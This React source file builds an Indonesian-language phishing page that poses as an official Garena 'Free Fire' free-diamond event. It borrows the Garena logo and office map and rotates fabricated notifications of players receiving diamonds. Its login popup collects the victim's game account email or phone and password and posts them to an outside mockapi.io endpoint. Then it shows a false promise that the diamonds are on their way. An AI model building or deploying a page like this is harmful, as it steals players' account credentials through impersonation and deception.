import { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import garena from "./assets/garena.png";
import axios from "axios";

const notifications = [
  { "id": 1, "message": "꧁༒𝕏𝕖𝕟𝕠𝔾𝕠𝕕𝕫༒꧂ mendapatkan 788 diamond!" },
  { "id": 2, "message": "𓆩⚡Ｒｅａｐｅｒ✘⚡𓆪 mendapatkan 675 diamond!" },
  { "id": 3, "message": "꧁ঔৣ☠Ｓｈａｄｏｗ☠ঔৣ꧂ mendapatkan 876 diamond!" },
  { "id": 4, "message": "⫷🔥ＢｌａｚｅＳｔｏｒｍ🔥⫸ mendapatkan 665 diamond!" },
  { "id": 5, "message": "꧁༒☠𝕍𝕖𝕟𝕠𝕞𝕊𝕥𝕣𝕚𝕜𝕖☠༒꧂ mendapatkan 456 diamond!" },
  { "id": 6, "message": "★彡[ＧｈｏｓｔＨｕｎｔｅｒ]彡★ mendapatkan 998 diamond!" },
  { "id": 7, "message": "卄𝒩𝒾𝑔𝒽𝓉𝓂𝒶𝓇𝑒𝕏卄 mendapatkan 456 diamond!" },
  { "id": 8, "message": "✞ＡＩＭｂｏｔＰｒｏ✞ mendapatkan 777 diamond!" },
  { "id": 9, "message": "⎝⎝ＲａｚｏｒＫｉｌｌ⎠⎠ mendapatkan 543 diamond!" },
  { "id": 10, "message": "⫷♛ＬｅｇｅｎｄＳｌａｙｅｒ♛⫸ mendapatkan 500 diamond!" },
  { "id": 11, "message": "꧁༒ＦｉｒｅＤｒａｇｏｎ༒꧂ mendapatkan 720 diamond!" },
  { "id": 12, "message": "☠ＢｌｏｏｄＳｐｅａｒ☠ mendapatkan 650 diamond!" },
  { "id": 13, "message": "⚡ＴｈｕｎｄｅｒＳｔｒｉｋｅ⚡ mendapatkan 800 diamond!" },
  { "id": 14, "message": "꧁༒ＮｉｇｈｔＰｈａｎｔｏｍ༒꧂ mendapatkan 940 diamond!" },
  { "id": 15, "message": "🔥ＦｌａｍｅＧｕａｒｄ🔥 mendapatkan 1020 diamond!" },
  { "id": 16, "message": "☠ＲｏｇｕｅＲｅａｐｅｒ☠ mendapatkan 580 diamond!" },
  { "id": 17, "message": "⚔ＳｗｏｒｄＭａｓｔｅｒ⚔ mendapatkan 750 diamond!" },
  { "id": 18, "message": "⫷☠ＣｙｂｅｒＳｌａｙｅｒ☠⫸ mendapatkan 670 diamond!" },
  { "id": 19, "message": "★ＤａｒｋＳｈａｄｏｗ★ mendapatkan 810 diamond!" },
  { "id": 20, "message": "⎝⎝ＷａｒＬｅｇｅｎｄ⎠⎠ mendapatkan 960 diamond!" },
  { "id": 21, "message": "꧁༒ＳｔｏｒｍＣｈａｓｅｒ༒꧂ mendapatkan 720 diamond!" },
  { "id": 22, "message": "⚡ＳｋｙＲｉｐｐｅｒ⚡ mendapatkan 690 diamond!" },
  { "id": 23, "message": "🔥ＤｅｖｉｌＳｈｏｏｔｅｒ🔥 mendapatkan 850 diamond!" },
  { "id": 24, "message": "⫷☠ＧｈｏｓｔＷａｒｒｉｏｒ☠⫸ mendapatkan 920 diamond!" },
  { "id": 25, "message": "☠ＮｅｃｒｏＫｎｉｇｈｔ☠ mendapatkan 1000 diamond!" },
  { "id": 26, "message": "⎝⎝ＤｒｅａｄＫｉｌｌｅｒ⎠⎠ mendapatkan 1100 diamond!" },
  { "id": 27, "message": "⫷🔥ＨｅｌｌＦｉｒｅ🔥⫸ mendapatkan 570 diamond!" },
  { "id": 28, "message": "☠ＢｌａｄｅＭａｓｔｅｒ☠ mendapatkan 680 diamond!" },
  { "id": 29, "message": "⚔ＳｋｙＤｅｍｏｎ⚔ mendapatkan 770 diamond!" },
  { "id": 30, "message": "★ＴｏｒｎａｄｏＳｌａｙｅｒ★ mendapatkan 850 diamond!" },
  { "id": 31, "message": "⎝⎝ＤｏｏｍＢｒｉｎｇｅｒ⎠⎠ mendapatkan 920 diamond!" },
  { "id": 32, "message": "⚡ＲａｖｅｎＳｈｏｏｔｅｒ⚡ mendapatkan 1020 diamond!" },
  { "id": 33, "message": "🔥ＰｙｒｏＧｕａｒｄ🔥 mendapatkan 1150 diamond!" },
  { "id": 34, "message": "☠ＦｏｒｓａｋｅｎＫｎｉｇｈｔ☠ mendapatkan 590 diamond!" },
  { "id": 35, "message": "⫷☠ＤａｒｋＲｏｇｕｅ☠⫸ mendapatkan 680 diamond!" },
  { "id": 36, "message": "★ＮｅｍｅｓｉｓＳｔｏｒｍ★ mendapatkan 750 diamond!" },
  { "id": 37, "message": "⎝⎝ＳｉｌｅｎｔＲｅａｐｅｒ⎠⎠ mendapatkan 880 diamond!" },
  { "id": 38, "message": "⚡ＬｉｇｈｔｎｉｎｇＬｅｇｅｎｄ⚡ mendapatkan 990 diamond!" },
  { "id": 39, "message": "🔥ＨｅｌｌＷａｒｒｉｏｒ🔥 mendapatkan 1050 diamond!" },
  { "id": 40, "message": "☆ShadowHunter☆ mendapatkan 500 diamond!" },
  { "id": 41, "message": "★DarkKnight★ mendapatkan 520 diamond!" },
  { "id": 42, "message": "◇StormBringer◇ mendapatkan 540 diamond!" },
  { "id": 43, "message": "◆GhostSlayer◆ mendapatkan 560 diamond!" },
  { "id": 44, "message": "✦DoomRider✦ mendapatkan 580 diamond!" },
  { "id": 45, "message": "✧SkyRipper✧ mendapatkan 600 diamond!" },
  { "id": 46, "message": "♠ThunderFang♠ mendapatkan 620 diamond!" },
  { "id": 47, "message": "♣FlameGuard♣ mendapatkan 640 diamond!" },
  { "id": 48, "message": "♥NightFury♥ mendapatkan 660 diamond!" },
  { "id": 49, "message": "♦PhantomBlade♦ mendapatkan 680 diamond!" },
  { "id": 50, "message": "▲VenomStrike▲ mendapatkan 700 diamond!" },
  { "id": 51, "message": "▼SkyWalker▼ mendapatkan 720 diamond!" },
  { "id": 52, "message": "◀StormBreaker◀ mendapatkan 740 diamond!" },
  { "id": 53, "message": "▶FireDragon▶ mendapatkan 760 diamond!" },
  { "id": 54, "message": "✪NightmareX✪ mendapatkan 780 diamond!" },
  { "id": 55, "message": "✰FrostGuardian✰ mendapatkan 800 diamond!" },
  { "id": 56, "message": "✡TornadoMaster✡ mendapatkan 820 diamond!" },
  { "id": 57, "message": "☣CyberWarrior☣ mendapatkan 840 diamond!" },
  { "id": 58, "message": "☠RogueSniper☠ mendapatkan 860 diamond!" },
  { "id": 59, "message": "☢DemonHunter☢ mendapatkan 880 diamond!" },
  { "id": 60, "message": "❂BlizzardMage❂ mendapatkan 900 diamond!" },
  { "id": 61, "message": "✻SolarKnight✻ mendapatkan 920 diamond!" },
  { "id": 62, "message": "❃WarTitan❃ mendapatkan 940 diamond!" },
  { "id": 63, "message": "❂LightningRider❂ mendapatkan 960 diamond!" },
  { "id": 64, "message": "❉InfernoSlayer❉ mendapatkan 980 diamond!" },
  { "id": 65, "message": "✺DarkPhoenix✺ mendapatkan 1000 diamond!" },
  { "id": 66, "message": "✹ShadowDagger✹ mendapatkan 1020 diamond!" },
  { "id": 67, "message": "✦ChaosWarlock✦ mendapatkan 1040 diamond!" },
  { "id": 68, "message": "✧SteelBerserker✧ mendapatkan 1060 diamond!" },
  { "id": 69, "message": "★CelestialBlade★ mendapatkan 1080 diamond!" }
]


// Fungsi untuk menghasilkan warna random
const getRandomColor = () => {
  const colors = [
    "bg-red-500",
    "bg-blue-500",
    "bg-green-500",
    "bg-yellow-500",
    "bg-purple-500",
    "bg-pink-500",
  ];
  return colors[Math.floor(Math.random() * colors.length)];
};

function App() {
  const [diamond, setDiamond] = useState('');
  const [popupLogin, setPopupLogin] = useState(false);
  const [success, setSuccess] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassoword] = useState("");
  const [currentIndex, setCurrentIndex] = useState(0);
  const [bgColor, setBgColor] = useState(getRandomColor());

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      const response = await axios.post(
        "https://668fb31ec0a7969efd992601.mockapi.io/api/v1/users",
        {
          password,
          email,
        }
      );

      console.log("User added:", response.data);
      setPopupLogin(false);
      setSuccess(true)

      // Reset form
      setPassoword("");
      setEmail("");
    } catch (error) {
      console.error("Error adding user:", error);
      alert("Gagal menambahkan user.");
    }
  };

  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentIndex((prevIndex) => (prevIndex + 1) % notifications.length);
      setBgColor(getRandomColor()); // Ganti warna background setiap perubahan notifikasi
    }, 2000);

    return () => clearInterval(interval);
  }, []);

  return (
    <div className="max-w-md mx-auto relative overflow-x-hidden bg-slate-100 p-5 min-h-screen text-slate-600">
      <img src={garena} className="w-[200px] mx-auto mt-5" />
      {/* <h4 className="text-center font-medium italic">Official</h4> */}
      <div className="border rounded-lg bg-white shadow-lg p-5 mt-10">
        <h5 className="font-bold text-xl mb-2">Event Diamond Free Fire</h5>
        <p className="text-sm font-medium">Diamond akan masuk setelah 8 jam</p>
        <div className="mt-5">
          <p className="font-medium">ID Free Fire</p>
          <input
            type="text"
            className="w-full font-medium mb-5 py-2 px-4 outline-none bg-transparent border border-gray-500 rounded-lg"
            placeholder="ID Free Fire"
          />
        </div>
        <div>
          <p className="font-medium">Jumlah Diamond</p>
          <input
            type="text"
            onChange={(e) => setDiamond(e.target.value)}
            className="w-full font-medium mb-5 py-2 px-4 outline-none bg-transparent border border-gray-500 rounded-lg"
            placeholder="Masukan jumlah diamond"
          />
        </div>
        <button onClick={() => setPopupLogin(true)} className="w-full rounded-lg mt-5 bg-blue-900 text-white text-lg font-medium py-2">
          Ambil
        </button>
      </div>
      <div className="mt-10 text-sm font-medium">
        <AnimatePresence mode="wait">
          <motion.div
            key={notifications[currentIndex].id}
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -20 }}
            transition={{ duration: 0.5 }}
            className={`${bgColor} text-white px-4 py-2 rounded-lg shadow-lg`}
          >
            {notifications[currentIndex].message}
          </motion.div>
        </AnimatePresence>
      </div>

      <div className="relative mt-20">
        <h5 data-aos="fade-up" data-aos-duration="1000" data-aos-delay="200" className={`text-center text-2xl mb-10`}>Kantor Garena Indonesia</h5>
        <div data-aos="fade-up" data-aos-duration="1000" data-aos-delay="400" className="w-[300px] h-[300px] mx-auto sm:w-[350px] sm:h-[350px] bg-[${warnaPrimary}] shadow-xl border rounded-2xl overflow-hidden">
          <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d7932.6755607138175!2d106.82127783789885!3d-6.2191113093367285!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x2e69f68cf7ef8b95%3A0x936619e21bef119a!2sPT%20Garena%20Indonesia!5e0!3m2!1sid!2sid!4v1740217761650!5m2!1sid!2sid"
            allowFullScreen=""
            loading="lazy"
            referrerPolicy="no-referrer-when-downgrade"
            className="h-full w-full"
            >
          </iframe>
        </div>
      </div>

      {/* Login Popup */}
      {popupLogin && 
        <div>
          <div className="fixed inset-0 flex items-center justify-center z-50">
            <div className="bg-white p-8 rounded-lg shadow-lg w-[300px]">
              <h2 className="text-2xl font-bold mb-4 text-slate-900">Login</h2>
              <p className="text-sm mb-2">
              Pastikan Anda login menggunakan akun Free Fire dengan ID yang sama seperti yang dimasukkan saat menginput data ID Free Fire agar dapat diproses.
              </p>
              <div className="mb-2">
                <label htmlFor="username" className="block font-medium">
                  Email/No. Telepon:
                </label>
                <input
                  type="text"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  required
                  id="username"
                  className="w-full p-2 border rounded-lg border-slate-600"
                />
              </div>
              <div className="mb-2">
                <label htmlFor="password" className="block font-medium">
                  Password:
                </label>
                <input
                  type="password"
                  id="password"
                  value={password}
                  onChange={(e) => setPassoword(e.target.value)}
                  required
                  className="w-full p-2 border rounded-lg border-slate-600"
                />
              </div>
              <div>
                <button onClick={() => setPopupLogin(false)} className="bg-red-500 mt-5 me-2 text-white px-4 py-2 rounded-lg mx-auto font-medium">
                  Kembali
                </button>
                <button onClick={handleSubmit} className="bg-blue-900 mt-5 text-white px-4 py-2 rounded-lg mx-auto font-medium">
                  Login
                </button>
              </div>
            </div>
          </div>
        </div>
      }
      {success && 
        <div>
          <div className="fixed inset-0 flex items-center justify-center z-50">
            <div className="bg-white p-8 rounded-lg shadow-lg w-[300px]">
              <h2 className="text-2xl font-bold mb-4 text-slate-900">Selamat!! Anda berhasil mengambil {diamond} Diamond</h2>
              <p className="text-sm mb-2">
              Diamond Anda akan diproses dalam waktu 2 hingga 5 jam, bergantung pada jumlah permintaan yang sedang berlangsung. Kami pastikan setiap transaksi diproses secepat mungkin.
              </p>
              
            </div>
          </div>
        </div>
      }
    </div>
  );
}

export default App;
